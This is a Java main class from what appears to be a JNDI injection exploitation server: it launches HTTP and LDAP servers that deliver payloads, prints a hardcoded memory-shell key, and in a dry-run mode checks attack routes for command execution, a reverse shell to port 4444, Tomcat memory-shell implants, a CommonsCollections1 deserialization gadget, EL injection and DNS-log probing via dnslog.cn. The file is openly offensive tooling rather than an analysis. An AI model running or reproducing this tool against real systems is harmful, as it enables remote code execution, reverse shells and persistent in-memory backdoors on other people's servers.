package com.bloom;

import com.bloom.parser.ParsedRoute;
import com.bloom.parser.RouteParser;
import com.bloom.server.HttpServerStart;
import com.bloom.session.DryRunResult;
import com.bloom.util.config;

import static com.bloom.server.LdapServer.lanuchLDAPServer;

public class Run {
    public static void main(String[] args) throws Exception {
        config.applyCmdArgs(args);

        if (config.dryRun) {
            runDryMode();
            return;
        }

        HttpServerStart httpServerStart = new HttpServerStart();
        httpServerStart.start();
        lanuchLDAPServer();
        System.out.println("memshellKEY: ck4Gr4Qi");
    }

    private static void runDryMode() {
        System.out.println("=== DRY RUN MODE ===");
        System.out.println("验证路径解析，不启动服务");
        System.out.println();

        RouteParser parser = new RouteParser();
        DryRunResult result = new DryRunResult();

        String[] testRoutes = {
            "basic/open -a calculator",
            "basic/base64/b3BlbiAtYSBjYWxjdWxhdG9y",
            "basic/reverseshell/127.0.0.1/4444",
            "basic/memshell/TomcatFilterMemShellFromThread",
            "URLDNS/dnslog.cn",
            "EL/base64/b3BlbiAtYSBjYWxjdWxhdG9y",
            "EL/reverseshell/127.0.0.1/4444",
            "EL/memshell/tomcatmemshell1",
            "CommonsCollections1/memshell/TomcatFilterMemShellFromThread",
            "fuzz/EL/dnslog.cn",
            "fuzzbyDNS/dnslog.cn"
        };

        if (!config.testRoutes.isEmpty()) {
            testRoutes = config.testRoutes.split(",");
        }

        for (String route : testRoutes) {
            ParsedRoute parsed = parser.parse(route.trim());
            result.addEntry(parsed);
        }

        result.printReport();

        if (result.isAllValid()) {
            System.out.println("所有路径验证通过");
        } else {
            System.out.println("部分路径验证失败，请检查错误信息");
            System.exit(1);
        }
    }
}
